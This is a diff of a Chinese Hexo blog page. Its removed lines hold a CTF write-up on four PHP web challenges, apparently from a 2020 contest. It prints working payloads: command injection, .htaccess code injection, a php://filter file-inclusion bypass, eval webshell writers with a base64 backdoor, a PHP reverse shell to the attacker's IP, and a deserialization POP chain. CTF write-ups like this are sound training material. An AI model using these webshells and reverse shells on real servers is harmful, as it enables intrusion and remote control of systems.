-                <time title="修改时间：2020-10-14 17:06:13" itemprop="dateModified" datetime="2020-10-14T17:06:13+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>5.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
-<li>web考的是misc，之前一段时间一直忙着培训也没有时间。</li>
-</ul>
-<h2 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h2><ul>
-<li>源码在MP3里面，不知道这样做的意义是什么难道有人会在写网站的时候把源码放进mp3里面？？？这样做真的够无聊的。</li>
-<li>源码</li>
-</ul>
-<pre><code class="php">if(empty($_POST[&#39;Black-Cat-Sheriff&#39;]) || empty($_POST[&#39;One-ear&#39;])){ die(&#39;Ë•£¡3⁄41 ̧Ò2ÈÎÒÒ»Ö»¶úμÄÎ2°Í£¡&#39;);
-}
-$clandestine = getenv(&quot;clandestine&quot;);
-if(isset($_POST[&#39;White-cat-monitor&#39;]))
-$clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;],
-$clandestine);
-$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);
-if($hh !== $_POST[&#39;Black-Cat-Sheriff&#39;]){ die(&#39;ÓÐÒâÃé×1⁄4£¬ÎÞÒâ»÷·¢
-£¬ÄãμÄÃÎÏë3⁄4ÍÊÇÄãÒaÃé×1⁄4μÄÄ¿±ê¡£ÏàÐÅ×Ô1⁄4o£¬Äã3⁄4ÍÊÇÄÇ¿ÅÉäÖÐ°ÐÐÄμÄ×Óμ ̄¡£&#39;); }
-echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);</code></pre>
-<ul>
-<li><p>这是原题:<a href="https://neversecure.ca/category/bug-hunting/" target="_blank" rel="noopener">https://neversecure.ca/category/bug-hunting/</a></p>
-</li>
-<li><p>老知识点了，数组加密得到nu l l用null去加密得到hash值。</p>
-</li>
-</ul>
-<pre><code>Black-Cat- Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One- ear=%3Bcat+flag.php&amp;White-cat-monitor[]=1a</code></pre><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><ul>
-<li><p>原题X-NUCA‘2019 ——Ezphp</p>
-</li>
-<li><p>我们从代码的最后一行可见最后会强行拼接进来一个 “\nHello World” 导致 .hatccess 无法解析 500错误。所以使用反斜杠可以将 \n 转义为普通字符后使用#注释使得 .hatccess 能够成功解<br>析。</p>
-</li>
-<li><p>绕过 检测同样使用<code>\</code>作为换行直接绕过该函数的关键字检测。</p>
-</li>
-<li><p>将 .hatccess 包含进所以php文件。</p>
-</li>
-</ul>
-<pre><code>php_valueauto_prepend_file.htaccess</code></pre><ul>
-<li>综上构造payload:</li>
-</ul>
-<pre><code>php_value auto_prepend_fil\ 
-e .htaccess
-#&lt;?php phpinfo();?&gt;\</code></pre><ul>
-<li>exp</li>
-</ul>
-<pre><code>?content=php_valueauto_prepend_fil\%0Ae.htaccess%0A%23&lt;?phpsystem(&#39;cat /fla&#39;.&#39;g&#39;);?&gt;\&amp;filename=.htaccess</code></pre><h2 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h2><ul>
-<li>目测是文件包含了。</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/macpic/pic1.png" alt="pic1"></p>
-<ul>
-<li>用base64或者rot13读文件发现被过滤了,由于<code>include()</code>    可以解码一次url所以可以用双url编码绕过,这里。</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/macpic/pic2.png" alt="pic2"></p>
-<ul>
-<li>翻阅PHP文档发现还有另外一个过滤器能用：</li>
-</ul>
-<blockquote>
-<p><a href="https://www.php.net/manual/zh/filters.convert.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.convert.php</a></p>
-</blockquote>
-<p><img src="http://goodcheerleung.gitee.io/macpic/pic3.png" alt="pic3"></p>
-<ul>
-<li>例如：</li>
-</ul>
-<pre><code>http://183.129.189.60:10021/?file=php://filter/read=convert.quoted-printable-encode/resource=GWHT.php</code></pre><ul>
-<li><p>解码：</p>
-<p><img src="http://goodcheerleung.gitee.io/macpic/pic5.png" alt="pic5"></p>
-</li>
-<li><p>源码：</p>
-</li>
-</ul>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
-    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
-    &lt;title&gt;count is here&lt;/title&gt;
-
-    &lt;style&gt;
-
-        html,
-        body {
-            overflow: none;
-            max-height: 100vh;
-        }
-
-    &lt;/style&gt;
-&lt;/head&gt;
-
-&lt;body style=&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;&gt;
-
-&lt;center&gt;&lt;img src=&quot;question.jpg&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt; &lt;/center&gt;
-
-    &lt;?php
-    ini_set(&#39;max_execution_time&#39;, 5);
-
-    if ($_COOKIE[&#39;pass&#39;] !== getenv(&#39;PASS&#39;)) {
-        setcookie(&#39;pass&#39;, &#39;PASS&#39;);
-        die(&#39;&lt;h2&gt;&#39;.&#39;&lt;hacker&gt;&#39;.&#39;&lt;h2&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;&lt;h1&gt;&#39;.&#39;404&#39;.&#39;&lt;h1&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;Sorry, only people from GWHT are allowed to access this website.&#39;.&#39;23333&#39;);
-    }
-    ?&gt;
-
-    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;
-
-    &lt;form&gt;
-        &lt;input type=&quot;hidden&quot; value=&quot;GWHT.php&quot; name=&quot;file&quot;&gt;
-        &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; name=&quot;count&quot; rows=10 cols=50&gt;&lt;/textarea&gt;&lt;br /&gt;
-        &lt;input type=&quot;submit&quot;&gt;
-    &lt;/form&gt;
-
-    &lt;?php
-    if (isset($_GET[&quot;count&quot;])) {
-        $count = $_GET[&quot;count&quot;];
-        if(preg_match(&#39;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#39;, $count)){
-            die(&#39;hacker!&#39;);
-        }
-        echo &quot;&lt;h2&gt;The Count is: &quot; . exec(&#39;printf \&#39;&#39; . $count . &#39;\&#39; | wc -c&#39;) . &quot;&lt;/h2&gt;&quot;;
-    }
-    ?&gt;
-
-&lt;/body&gt;
-
-&lt;/html&gt;</code></pre><ul>
-<li>index.php</li>
-</ul>
-<pre><code>&lt;?php
-if (isset($_GET[&#39;file&#39;])) {
-    if(preg_match(&#39;/#|base64|rot13|base32|base16/i&#39;, $_GET[&#39;file&#39;])){
-            die(&#39;G0-OUT&#39;.&#39;&lt;br&gt;&#39;.&#39;hacker!&#39;);
-        }
-
-    require_once($_GET[&#39;file&#39;]);
-} else {
-    header(&#39;Location: /?file=GWHT.php&#39;);
-}
-</code></pre><ul>
-<li><p>密码盲猜是：<code>GWHT</code></p>
-</li>
-<li><p>由于过滤了<code>$_POST</code>和<code>$_GET</code>直接用<code>get_defined_vars()</code>代替payload如下：</p>
-</li>
-</ul>
-<pre><code class="phop">http://183.129.189.60:10021/?file=GWHT.php&amp;count=%27`echo%20%22%3C?=eval(pos(pos(get_defined_vars())))?%3E%22%3E2.php`%27</code></pre>
-<ul>
-<li>再写一个正常的木马,：</li>
-</ul>
-<pre><code>http://183.129.189.60:10021/2.php?a=file_put_contents(&#39;cnm.php&#39;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbYWFdKTs/Pg%3d%3d&quot;))%3b</code></pre><ul>
-<li>使用PHP反弹一个交互shell</li>
-</ul>
-<pre><code class="php">&lt;?php
-  $sock=fsockopen(&quot;localhost&quot;,12345);//localhost为自己的外网ip，端口任意
-  exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);
-?&gt;</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/macpic/pic4.png" alt="pic4"></p>
-<ul>
-<li>做到这里洗澡去了，回来环境关了。算了。</li>
-</ul>
-<h2 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h2><ul>
-<li><p>扫描器扫出一个robots.txt</p>
-</li>
-<li><p>提示：</p>
-</li>
-</ul>
-<pre><code>&lt;!-- 小胖说用个不安全的协议从我家才能进ser.php呢! !--&gt;</code></pre><ul>
-<li>源码：</li>
-</ul>
-<pre><code class="php">&lt;?php
-error_reporting(0);
-if ( $_SERVER[&#39;REMOTE_ADDR&#39;] == &quot;127.0.0.1&quot; ) {
-    highlight_file(__FILE__);
-}
-$flag=&#39;{Trump_:&quot;fake_news!&quot;}&#39;;
-class GWHT{
-    public $hero;
-public function __construct(){ $this-&gt;hero = new Yasuo;
-    }
-    public function __toString(){
-if (isset($this-&gt;hero)){
-return $this-&gt;hero-&gt;hasaki();
-        }else{
-            return &quot;You don&#39;t look very happy&quot;;
-} }
-}
-class Yongen{ //flag.php
-    public $file;
-    public $text;
-    public function __construct($file=&#39;&#39;,$text=&#39;&#39;) {
-$this -&gt; file = $file; $this -&gt; text = $text;
-}
-public function hasaki(){
-$d = &#39;&lt;?php die(&quot;nononon&quot;);?&gt;&#39;; $a= $d. $this-&gt;text;
-@file_put_contents($this-&gt; file,$a); }
-}
-class Yasuo{
-    public function hasaki(){
-        return &quot;I&#39;m the best happy windy man&quot;;
-    }
-}/*$c=$_GET[&#39;c&#39;];
-echo $x=unserialize($c);*/
-?&gt;</code></pre>
-<ul>
-<li>简单的POP链</li>
-</ul>
-<pre><code class="php">&lt;?php
-class GWHT{
-    public $hero;
-}
-class Yongen{ //flag.php
-public $file = &quot;php://filter/convert.base64-decode/resource=aaa.php&quot;;
-    public $text = &quot;aaaPD9waHAgZXZhbCgkX1BPU1Rbc10pOyAgPz4=&quot;;
-}
-$a = new GWHT;
-$a-&gt;hero = new Yongen;
-echo urlencode(serialize($a));</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2616,7 +2551,7 @@ echo urlencode(serialize($a));</code></pre>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-count">68</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2687,12 +2622,12 @@ echo urlencode(serialize($a));</code></pre>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">244k</span>
+    <span title="站点总字数">248k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:42</span>
+    <span title="站点阅读时长">3:46</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
